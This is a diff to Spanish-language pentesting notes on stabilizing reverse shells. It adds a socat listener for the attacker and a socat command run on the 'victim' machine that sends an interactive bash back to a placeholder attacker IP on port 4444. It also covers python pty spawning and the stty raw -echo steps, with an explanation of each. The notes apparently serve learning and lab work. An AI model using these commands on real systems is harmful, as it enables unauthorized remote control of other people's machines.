@@ -216,11 +216,45 @@ Métodos para la Estabilización de Shells Reversas
     ```
     rlwrap nc -lvnp 4444
     ```
-3. Python para una TTY completa: Si Python está disponible en el sistema objetivo, puedes intentar obtener una TTY completa con:
+
+3. Utilizar socat para una shell completamente interactiva: Si puedes subir archivos al objetivo o socat ya está presente, puedes usarlo para crear una conexión reversa que te brinde una TTY completa.
+En la máquina atacante
+```
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+```
+
+En la máquina víctima
+```
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ipAtacante:4444
+```
+
+4. Python para una TTY completa: Si Python está disponible en el sistema objetivo, puedes intentar obtener una TTY completa con:
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 Este comando intenta iniciar una nueva instancia de bash dentro de una pseudo-terminal (PTY), lo que mejora significativamente la interactividad. tras esto se pasa el proceso a segundo plano con CTRL+Z y se ejecuta los siguientes comandos en nuestra terminal:
 ```
-$ stty raw -echo; fg
+$ stty raw -echo
+fg
 ```
+-----------------------
+Cuando obtienes una shell reversa y ejecutas python -c 'import pty; pty.spawn("/bin/bash")', estás mejorando la shell para que actúe más como un terminal interactivo. Esto es bueno, pero aún hay limitaciones debido a cómo se procesa la entrada y salida de datos en tu terminal local y la shell remota.
+
+Suspender la Shell Reversa
+Después de ejecutar el comando Python en la shell reversa, presionas Ctrl+Z. Esto suspende la shell reversa, poniéndola en segundo plano, y te devuelve el control a tu terminal local. La shell reversa aún está corriendo, pero está pausada.
+
+Configurar tu Terminal Local
+Una vez de vuelta en tu terminal local, ejecutas stty raw -echo. Esto cambia cómo tu terminal procesa la entrada y salida:
+
+raw: Este modo hace que tu terminal envíe los caracteres directamente a la shell reversa sin procesarlos. Esto significa que, en lugar de tu terminal local interpretar ciertas teclas (como las teclas de flecha para navegar por el historial de comandos), esa entrada se envía directamente a la shell remota, permitiendo que esa funcionalidad sea manejada allí.
+
+-echo: Normalmente, tu terminal local muestra los caracteres que escribes. -echo desactiva esto, porque no quieres que tu terminal local trate de interpretar o mostrar tus entradas; quieres que todo eso se maneje en la shell reversa remota.
+
+Volver a la Shell Reversa
+Después de ajustar la configuración de tu terminal, usas fg para traer la shell reversa de vuelta al primer plano. Esto significa que continúas trabajando en la shell reversa, pero ahora, debido a los ajustes que hiciste, la interacción será más fluida y funcionará más como un terminal normal. Por ejemplo, podrás usar teclas de flecha para navegar por tu historial de comandos.
+
+Cómo Volver a la Normalidad Después
+Trabajar en modo raw y sin eco puede hacer que tu terminal local actúe de manera extraña una vez que termines con la shell reversa. Por eso, después de cerrar la conexión reversa, a menudo necesitas ejecutar reset en tu terminal local para restaurar su comportamiento normal. Si no ves lo que escribes después de salir, es porque -echo aún está activo, y reset solucionará esto.
+
+---------------------------
+
